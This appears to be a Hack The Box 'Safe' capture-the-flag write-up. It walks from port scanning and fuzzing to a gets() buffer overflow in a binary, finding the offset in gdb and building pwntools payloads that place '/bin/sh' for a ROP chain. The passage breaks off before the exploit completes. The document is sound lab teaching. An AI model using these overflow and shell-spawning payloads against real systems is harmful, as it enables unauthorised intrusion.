I"ä
<h1 id="masscan--nmap">Masscan + Nmap</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-07-16 17:00:22 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 80/tcp on 10.10.10.147
Discovered open port 22/tcp on 10.10.10.147
Discovered open port 1337/tcp on 10.10.10.147
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de <span class="o">(</span>RSA<span class="o">)</span>
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     13:01:48 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP:
|     13:01:43 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|   GenericLines:
|     13:01:31 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
|   GetRequest:
|     13:01:37 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? GET / HTTP/1.0
|   HTTPOptions:
|     13:01:37 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? OPTIONS / HTTP/1.0
|   Help:
|     13:01:53 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? HELP
|   NULL:
|     13:01:31 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|   RPCCheck:
|     13:01:37 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|   RTSPRequest:
|     13:01:37 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TerminalServerCookie:
|     13:01:53 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
|   TLSSessionReq:
|     13:01:54 up 4:12, 0 <span class="nb">users</span>, load average: 0.00, 0.00, 0.00
|_    What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>95.78 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="apache-server-port-80">Apache server (Port-80)</h1>

<p>Directory Brute-forcing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://safe.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.php,.html <span class="nt">-fc</span> 401,403,405

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://safe.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

index.html              [Status: 200, Size: 10787, Words: 3445, Lines: 371]
.                       [Status: 200, Size: 10787, Words: 3445, Lines: 371]
manual                  [Status: 301, Size: 305, Words: 20, Lines: 10]
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Nothing much.
Visiting the home page:
<img src="/assets/img/Posts/Safe/safe-1.png" alt="safe-1.png" />
Watching the source code for the home page, I see a comment:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Apache2 Debian Default Page: It works<span class="nt">&lt;/title&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Which means the service running at port 1337 is related with <code class="language-plaintext highlighter-rouge">myapp</code> and can be downloaded here itself.
Trying to download it from <a href="http://safe.htb/myapp">http://safe.htb/myapp</a> works.
And we see that itâ€™s an 64 bit executable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="port-1337">Port 1337</h1>

<p>This service echoâ€™s out whatever we give to it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>nc safe.htb 1337
 13:37:31 up  4:48,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
<span class="nb">help

</span>What <span class="k">do </span>you want me to <span class="nb">echo </span>back? <span class="nb">help</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Which ghidra confirms when we decompile the binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td> --><td class="rouge-code"><pre>undefined8 main<span class="o">(</span>void<span class="o">)</span>
<span class="o">{</span>
  char local_78 <span class="o">[</span>112]<span class="p">;</span>
  
  system<span class="o">(</span><span class="s2">"/usr/bin/uptime"</span><span class="o">)</span><span class="p">;</span>
  <span class="nb">printf</span><span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">What do you want me to echo back? "</span><span class="o">)</span><span class="p">;</span>
  gets<span class="o">(</span>local_78<span class="o">)</span><span class="p">;</span>
  puts<span class="o">(</span>local_78<span class="o">)</span><span class="p">;</span>
  <span class="k">return </span>0<span class="p">;</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Binary uses gets() and thatâ€™s vulnerable to buffer overflow.</p>

<p>Opening myapp with gdb-peda and checking for protections on binary:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</pre></td></tr></tbody></table></code></pre></div></div>

<p>NX is enabled so we canâ€™t execute any code we write in stack. 
One possible attack which comes in mind when DEP is enabled is Return-to-libc attack, but we cannot do it here as we donâ€™t have the libc.
Letâ€™s take a closer look to the binary.</p>

<h1 id="rop-with-test">ROP with test()</h1>

<p>Listing all functions with gdb</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td> --><td class="rouge-code"><pre><span class="c"># gdb -q ./myapp</span>
Reading symbols from ./myapp...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./myapp<span class="o">)</span>
gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  <span class="nb">printf</span>@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  <span class="nb">test
</span>0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Letâ€™s see what is it doing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>disassemble <span class="nb">test
</span>Dump of assembler code <span class="k">for function </span><span class="nb">test</span>:
   0x0000000000401152 &lt;+0&gt;:     push   rbp
   0x0000000000401153 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000401156 &lt;+4&gt;:     mov    rdi,rsp
   0x0000000000401159 &lt;+7&gt;:     jmp    r13
   0x000000000040115c &lt;+10&gt;:    nop
   0x000000000040115d &lt;+11&gt;:    pop    rbp
   0x000000000040115e &lt;+12&gt;:    ret
End of assembler dump.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>These two instructions are just to setup a function in a stack. Every function starts with that.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>push   rbp
mov    rbp,rsp
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">rbp</code> is pushed, which means any value written at the top of the stack is moved to <code class="language-plaintext highlighter-rouge">rbp</code>. 
 Since in stack, data is written from lower to higher address but read from higher to lower address. Implies:
    <ol>
      <li>If we write 100 Aâ€™s and then <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>(null byte added to terminate the string, which is 8 bytes exact)</li>
      <li>Before <code class="language-plaintext highlighter-rouge">push rbp</code> instruction, <code class="language-plaintext highlighter-rouge">rsi</code> contains the whole <code class="language-plaintext highlighter-rouge">AAAAAAAAAAAAAA...../bin/sh\x00</code></li>
      <li>After <code class="language-plaintext highlighter-rouge">push rbp</code> instruction <code class="language-plaintext highlighter-rouge">rbp</code> takes the first 8 bytes on the top of the stack (higher memory address) which is <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code></li>
    </ol>
  </li>
  <li>Values of <code class="language-plaintext highlighter-rouge">rbp</code> are moved into <code class="language-plaintext highlighter-rouge">rsp</code> as well. Now both contains the string <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>mov    rdi,rsp
jmp    r13
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Values of <code class="language-plaintext highlighter-rouge">rsp</code> are moved into <code class="language-plaintext highlighter-rouge">rdi</code> and now <code class="language-plaintext highlighter-rouge">rdi</code> also contains the string <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>. Which means anything we write at the end of the <code class="language-plaintext highlighter-rouge">rsi</code>(Source index) will end up in <code class="language-plaintext highlighter-rouge">rdi</code>(Destination index).</li>
  <li>Jumping to whatever is in <code class="language-plaintext highlighter-rouge">r13</code> and anything in <code class="language-plaintext highlighter-rouge">rdi</code> is taken as parameters. So if weâ€™re able to keep system() in <code class="language-plaintext highlighter-rouge">r13</code>, itâ€™ll take our <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> in <code class="language-plaintext highlighter-rouge">rdi</code> as parameters and I can get a shell!</li>
</ul>

<h2 id="running-in-gdb">Running in gdb</h2>

<p>Running myapp fails:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>gdb <span class="nt">-q</span> ./myapp
Reading symbols from ./myapp...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./myapp<span class="o">)</span>
gdb-peda<span class="nv">$ </span>r
Starting program: /root/HTB/Safe/myapp
<span class="o">[</span>Attaching after process 106458 vfork to child process 106462]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 106462<span class="o">)]</span>
<span class="o">[</span>Detaching vfork parent process 106458 after child <span class="nb">exec</span><span class="o">]</span>
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 106458<span class="o">)</span> detached]
process 106462 is executing new program: /usr/bin/dash
<span class="o">[</span>Attaching after process 106462 vfork to child process 106463]
<span class="o">[</span>New inferior 3 <span class="o">(</span>process 106463<span class="o">)]</span>
<span class="o">[</span>Detaching vfork parent process 106462 after child <span class="nb">exec</span><span class="o">]</span>
<span class="o">[</span>Inferior 2 <span class="o">(</span>process 106462<span class="o">)</span> detached]
process 106463 is executing new program: /usr/bin/uptime
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
 18:46:49 up 23:20,  6 <span class="nb">users</span>,  load average: 0.37, 0.45, 0.33
<span class="o">[</span>Inferior 3 <span class="o">(</span>process 106463<span class="o">)</span> exited normally]

What <span class="k">do </span>you want me to <span class="nb">echo </span>back? Warning: not running
gdb-peda<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Trying something like <code class="language-plaintext highlighter-rouge">set follow-fork-mode parent</code> because myapp forks into a child process <code class="language-plaintext highlighter-rouge">/usr/bin/dash</code> and <code class="language-plaintext highlighter-rouge">/usr/bin/uptime</code> also didnâ€™t work.</p>

<p>I ran myapp in a terminal, got itâ€™s pid and attached to gdb.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>attach 105937
Attaching to program: /usr/bin/uptime, process 105937
warning: Build ID mismatch between current exec-file /usr/bin/uptime
and automatically determined exec-file /root/HTB/Safe/myapp
exec-file-mismatch handling is currently <span class="s2">"ask"</span>
Reading symbols from /root/HTB/Safe/myapp...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> /root/HTB/Safe/myapp<span class="o">)</span>
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/ec/3a1edbb04c6c2376a0f382429383cb2dfc350e.debug...
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/32/438eb3b034da54caf58c7a65446639f7cfe274.debug...
gdb-peda<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="finding-the-offset">Finding the offset</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 200
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And passed that to the terminal prompt myapp was running:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>./myapp
 18:56:41 up 23:30,  6 <span class="nb">users</span>,  load average: 0.03, 0.21, 0.26

What <span class="k">do </span>you want me to <span class="nb">echo </span>back? AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then <code class="language-plaintext highlighter-rouge">continue</code> in <code class="language-plaintext highlighter-rouge">gdb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7fd6a96d8f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0x8f62a0 <span class="o">(</span><span class="s2">"AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>...<span class="o">)</span>
RDI: 0x7fd6a97ab670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x41414e4141384141 <span class="o">(</span><span class="s1">'AA8AANAA'</span><span class="o">)</span>
RSP: 0x7fff8b8e6e78 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
RIP: 0x4011ac <span class="o">(</span>&lt;main+77&gt;:       ret<span class="o">)</span>
R8 : 0xc9
R9 : 0x0
R10: 0xfffffffffffff28e
R11: 0x246
R12: 0x401070 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x4011a1 &lt;main+66&gt;:  call   0x401030 &lt;puts@plt&gt;
   0x4011a6 &lt;main+71&gt;:  mov    eax,0x0
   0x4011ab &lt;main+76&gt;:  leave
<span class="o">=&gt;</span> 0x4011ac &lt;main+77&gt;:  ret
   0x4011ad:    nop    DWORD PTR <span class="o">[</span>rax]
   0x4011b0 &lt;__libc_csu_init&gt;:  push   r15
   0x4011b2 &lt;__libc_csu_init+2&gt;:        mov    r15,rdx
   0x4011b5 &lt;__libc_csu_init+5&gt;:        push   r14
Stopped reason: SIGSEGV
0x00000000004011ac <span class="k">in </span>main <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Watching where the program crashed shows itâ€™s in <code class="language-plaintext highlighter-rouge">ret</code> instruction and return will go to <code class="language-plaintext highlighter-rouge">rsp</code>.
You can pass that string at <code class="language-plaintext highlighter-rouge">rsp</code>: <code class="language-plaintext highlighter-rouge">jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</code>
or</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern search <span class="nv">$rsp</span>
Registers contain pattern buffer:
RBP+0 found at offset: 112
Registers point to pattern buffer:
<span class="o">[</span>RSI] <span class="nt">--</span><span class="o">&gt;</span> offset 0 - size ~203
<span class="o">[</span>RSP] <span class="nt">--</span><span class="o">&gt;</span> offset 120 - size ~80
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Which shows offset of <code class="language-plaintext highlighter-rouge">120</code> for <code class="language-plaintext highlighter-rouge">rsp</code>.</p>

<h2 id="confirming-the-offset">Confirming the offset</h2>

<p>We can do this with pythonâ€™s pwntools, without that boring attach thing.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/usr/bin/python3</span>
from pwn import <span class="k">*</span>

p <span class="o">=</span> gdb.debug<span class="o">(</span><span class="s1">'./myapp'</span>,<span class="s1">'''
set follow-fork-mode parent
'''</span><span class="o">)</span>

junk <span class="o">=(</span><span class="s1">'A'</span><span class="k">*</span> 120 + <span class="s1">'B'</span> <span class="k">*</span> 24<span class="o">)</span>.encode<span class="o">()</span>

p.sendline<span class="o">(</span>junk<span class="o">)</span>
p.interactive<span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>You can directly try <code class="language-plaintext highlighter-rouge">p = gdb.debug('./myapp')</code>, if gdb is following fork mode as parent already.
<code class="language-plaintext highlighter-rouge">interactive()</code> is used so that the spawned gdb windows does not kills itself when the process dies and Iâ€™ve time to see the registers before the process really dies.
Run that script, continue in gdb:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>c
Continuing.
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...
<span class="o">[</span>Detaching after vfork from child process 110195]

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7f95519f0f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0x21332a0 <span class="o">(</span><span class="s2">"What do you want me to echo back? "</span>, <span class="s1">'A'</span> &lt;repeats 120 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s1">'B'</span> &lt;repeats 24 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
RDI: 0x7f9551ac3670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x4141414141414141 <span class="o">(</span><span class="s1">'AAAAAAAA'</span><span class="o">)</span>
RSP: 0x7ffd6b53b328 <span class="o">(</span><span class="s1">'B'</span> &lt;repeats 24 <span class="nb">times</span><span class="o">&gt;)</span>
RIP: 0x4011ac <span class="o">(</span>&lt;main+77&gt;:       ret<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Shows that <code class="language-plaintext highlighter-rouge">rsi</code> contains that whole gets message and the string we passed. Then <code class="language-plaintext highlighter-rouge">rbp</code> is written with 8 bytes of Aâ€™s and all the 24 Bâ€™s we passed have gone to <code class="language-plaintext highlighter-rouge">rsp</code>. So we can confirm the offset is correct. We can successfully write anything we like in <code class="language-plaintext highlighter-rouge">RSP</code>.</p>

<h1 id="writing-binsh-onto-rdi">Writing /bin/sh onto RDI</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/usr/bin/python3</span>
from pwn import <span class="k">*</span>

p <span class="o">=</span> gdb.debug<span class="o">(</span><span class="s1">'./myapp'</span>,<span class="s1">'''
set follow-fork-mode parent
'''</span><span class="o">)</span>

junk <span class="o">=(</span><span class="s2">"A"</span><span class="k">*</span> 112<span class="o">)</span>.encode<span class="o">()</span>
shell <span class="o">=</span> <span class="s2">"/bin/sh</span><span class="se">\x</span><span class="s2">00"</span>.encode<span class="o">()</span>

p.sendline<span class="o">(</span>junk + shell<span class="o">)</span>
p.interactive<span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Since, <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> is 8 bytes (/bin/sh - 7 bytes and then a null byte to terminate the string), if weâ€™ve to keep that at the top of the stack, weâ€™ll keep it at the end. Hence junk is just 112 bytes now. Refer <a href="https://0xcaretaker.github.io/posts/Safe/#rop-with-test">ROP with test()</a> above for details.</p>

<p>When we run the script, we get SIGSEGV caused by an invalid memory reference. 
But weâ€™re able to write into <code class="language-plaintext highlighter-rouge">rbp</code> which will eventually end up onto <code class="language-plaintext highlighter-rouge">rsp</code> and then <code class="language-plaintext highlighter-rouge">rdi</code> when test() is called. I just need to fix the rest of the binary now.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
